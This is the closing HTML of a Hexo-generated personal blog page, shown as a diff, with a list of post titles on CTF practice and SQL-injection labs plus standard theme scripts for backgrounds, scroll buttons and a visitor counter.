+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/17/ctfshow%E5%85%A5%E9%97%A8/">ctfshow入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/linux/">Linux</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/">日常积累</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/BUUCTF/">BUUCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/sqli-labs/">sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/14/my-first-blog/">my first blog</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/14/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 John Doe
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
